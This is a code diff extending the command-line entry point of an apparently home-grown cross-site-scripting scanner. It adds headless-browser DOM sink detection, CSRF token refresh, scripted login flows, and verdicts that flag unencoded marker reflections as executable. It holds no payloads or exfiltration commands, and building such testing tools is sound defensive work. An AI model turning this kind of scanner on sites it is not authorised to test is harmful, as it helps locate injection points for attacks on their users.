+    # Phase 2.1: browser mode. For now the flag drives one thing -
+    # visit a URL via headless Chromium and print a summary. Later
+    # phases (2.2+) will make --dom compose with reflected/stored
+    # scan modes for DOM sink detection and JS-exec proof.
+    if args.dom:
+        try:
+            import dxadom
+        except ImportError as e:
+            print(f"[dxadom] harness import failed: {e}", file=sys.stderr)
+            sys.exit(2)
+        print(dxadom.summarize_availability())
+        ok, reason = dxadom.is_available()
+        if not ok:
+            sys.exit(2)
+        if not args.url:
+            # No URL given: the operator just wanted the availability
+            # check. Exit clean.
+            sys.exit(0)
+        if args.stored or args.flow or args.auth_flow:
+            print("[dxadom] --dom currently drives a bare URL visit only. "
+                  "Composition with --stored/--flow/--auth-flow is Phase 2.2+.",
+                  file=sys.stderr)
+            sys.exit(2)
+        with dxadom.BrowserSession() as sess:
+            summary = sess.visit(args.url)
+        print(f"[dxadom] visited {summary['url']} status={summary['status']} "
+              f"title={summary['title']!r} body_len={summary['body_len']}")
+        # Phase 2.2: report DOM sink hits (executed sinks, not response
+        # body reflections). Each hit is one call into a dangerous sink.
+        sinks = summary.get("sinks", [])
+        if sinks:
+            print(f"[dxadom] DOM sink hits ({len(sinks)}):")
+            for hit in sinks[:20]:
+                arg = (hit.get("arg") or "")[:120].replace("\n", " ")
+                print(f"    {hit.get('sink')}: {arg}")
+        if summary["console"]:
+            print(f"[dxadom] console ({len(summary['console'])} msg):")
+            for line in summary["console"][:10]:
+                print(f"    {line}")
+        if summary["errors"]:
+            print(f"[dxadom] errors ({len(summary['errors'])}):",
+                  file=sys.stderr)
+            for line in summary["errors"]:
+                print(f"    {line}", file=sys.stderr)
+            sys.exit(1)
+        sys.exit(0)
+
+    # Phase 1.4: wire CSRF refresh + header into module state
+    global CSRF_REFRESH_URL, CSRF_HEADER_NAME
+    if args.csrf_header and not args.csrf_refresh:
+        print("[dxadyn] --csrf-header requires --csrf-refresh", file=sys.stderr)
+        sys.exit(2)
+    CSRF_REFRESH_URL = args.csrf_refresh or ""
+    CSRF_HEADER_NAME = args.csrf_header or ""
+    if CSRF_REFRESH_URL:
+        _hdr = f"header='{CSRF_HEADER_NAME}'" if CSRF_HEADER_NAME else "no header install"
+        print(f"[dxadyn] csrf: refresh from {CSRF_REFRESH_URL} ({_hdr})")
+
     if args.cookie:
         apply_cookie(args.cookie)
         print(f"[dxadyn] session cookie attached to every request ({len(args.cookie)} chars)")
@@ -1316,7 +2105,41 @@ def main():
             print(f"[dxadyn] --header ignored (need 'Name: value'): {spec!r}",
                   file=sys.stderr)
 
-    if args.login:
+    # Phase 1.5: --auth-flow runs BEFORE the scan proper (--flow / --stored /
+    # reflected) so any subsequent HTTP path picks up the installed auth
+    # header + cookie jar automatically.
+    if args.auth_flow:
+        if args.login:
+            print("[dxadyn] both --auth-flow and --login given; "
+                  "--auth-flow wins, --login ignored", file=sys.stderr)
+        aflow = _load_flow(args.auth_flow)
+        if "__error__" in aflow:
+            print(f"[dxadyn] {aflow['__error__']}", file=sys.stderr)
+            sys.exit(2)
+        asummary = run_auth_flow(aflow)
+        if asummary["error"]:
+            print(f"[dxadyn] auth-flow error: {asummary['error']}",
+                  file=sys.stderr)
+            sys.exit(2)
+        if asummary["auth_header"]:
+            hname, _ = asummary["auth_header"]
+            print(f"[dxadyn] auth-flow '{asummary['name']}' installed "
+                  f"'{hname}' header + {asummary['steps_run']} step(s)")
+        elif asummary["authenticated"]:
+            print(f"[dxadyn] auth-flow '{asummary['name']}' set cookies "
+                  f"({asummary['steps_run']} step(s))")
+        else:
+            print(f"[dxadyn] auth-flow '{asummary['name']}' completed but "
+                  f"nothing stuck (no header, no cookie). Continuing "
+                  f"unauthenticated.", file=sys.stderr)
+
+        # If the operator ONLY passed --auth-flow (no scan mode selected),
+        # exit clean after auth installation - useful for a two-step run
+        # where the caller composes multiple dxadyn invocations.
+        if not (args.stored or args.flow or args.url):
+            sys.exit(0)
+
+    elif args.login:
         if not (args.user and args.password):
             print("[dxadyn] --login requires --user and --pass", file=sys.stderr)
             sys.exit(2)
@@ -1324,6 +2147,32 @@ def main():
                    user_field=args.user_field, pass_field=args.pass_field,
                    csrf_field=args.csrf_field or None)
         print(f"[dxadyn] login {args.login} -> {'OK' if ok else 'FAILED (continuing anyway)'}")
+
+    # Phase 1.3: --flow short-circuits the stored/reflected paths. A flow
+    # carries its own steps + verdict step(s); we just run it and print.
+    if args.flow:
+        flow = _load_flow(args.flow)
+        if "__error__" in flow:
+            print(f"[dxadyn] {flow['__error__']}", file=sys.stderr)
+            sys.exit(2)
+        summary = run_flow(flow)
+        print(f"[dxadyn] flow '{summary['name']}' ran {summary['steps_run']} step(s)")
+        if summary["error"]:
+            print(f"[dxadyn] flow error: {summary['error']}", file=sys.stderr)
+            sys.exit(1)
+        hits = [v for v in summary["verdicts"] if v["reflection"] == "unencoded"]
+        if hits:
+            for v in hits:
+                print(f"  [EXECUTABLE] verdict at {v['step']}: {v['url']} "
+                      f"(HTTP {v['status']}, marker survived raw)")
+            sys.exit(0)
+        elif summary["verdicts"]:
+            for v in summary["verdicts"]:
+                print(f"  [{v['reflection']}] verdict at {v['step']}: {v['url']} (HTTP {v['status']})")
+            sys.exit(0)
+        else:
+            print("[dxadyn] flow ran; no verdict step defined (add \"verdict\": true).")
+            sys.exit(0)
 
     if args.stored:
         if not args.target:
